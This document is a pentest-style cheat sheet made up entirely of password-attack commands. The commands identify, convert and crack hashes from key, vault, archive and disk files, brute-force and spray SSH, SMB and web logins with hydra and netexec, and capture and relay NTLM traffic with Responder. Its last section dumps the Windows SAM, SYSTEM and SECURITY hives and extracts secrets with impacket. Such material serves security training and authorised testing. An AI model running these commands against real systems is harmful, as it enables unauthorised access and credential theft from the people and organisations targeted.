## Passwords

### Identify

```bash
hashid hashes.txt
nth --file hashes.txt
hashcat --example-hashes | less
```

### Convert

```bash
ssh2john id_rsa > ssh.hash
keepass2john Database.kdbx > keepass.hash
zip2john backup.zip > zip.hash
pdf2john report.pdf > pdf.hash
office2john payroll.xlsx > office.hash
bitlocker2john -i disk.img > bitlocker.hash
unshadow passwd shadow > linux.hash
```

### Crack

```bash
hashcat -m 0 md5.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
hashcat -m 1000 ntlm.hash /usr/share/wordlists/rockyou.txt
hashcat -m 5600 netntlmv2.hash /usr/share/wordlists/rockyou.txt
hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt
hashcat -m 13100 tgs.hash /usr/share/wordlists/rockyou.txt
hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt
hashcat -m 1000 ntlm.hash --show
john --wordlist=/usr/share/wordlists/rockyou.txt zip.hash
john --show zip.hash
```

### Candidates

```bash
cewl -d 2 -m 5 -w cewl.txt "$URL"
hashcat --stdout cewl.txt -r /usr/share/hashcat/rules/best64.rule > candidates.txt
sort -u candidates.txt -o candidates.txt
```

### Online

```bash
hydra -l george -P candidates.txt -f -V "ssh://$IP" -o ssh-hydra.txt
hydra -L users.txt -p 'Nexus123!' -f -V "smb://$IP" -o smb-hydra.txt
hydra -l pete -P candidates.txt "$IP" http-post-form '/login:username=^USER^&password=^PASS^:F=Invalid credentials' -o http-hydra.txt
netexec smb "$IP" -u users.txt -p 'Nexus123!' -d "$DOMAIN" --continue-on-success | tee spray.txt
```

### Responder

```bash
sudo responder -I tun0 -v | tee responder.txt
impacket-ntlmrelayx --no-http-server -smb2support -t "$IP" -c 'whoami'
```

### Windows hives

```cmd
REM Save the SAM registry hive.
reg save HKLM\SAM C:\Windows\Temp\sam
REM Save the SYSTEM registry hive.
reg save HKLM\SYSTEM C:\Windows\Temp\system
REM Save the SECURITY registry hive.
reg save HKLM\SECURITY C:\Windows\Temp\security
```

```bash
impacket-secretsdump -sam sam -system system -security security LOCAL | tee secrets.txt
```
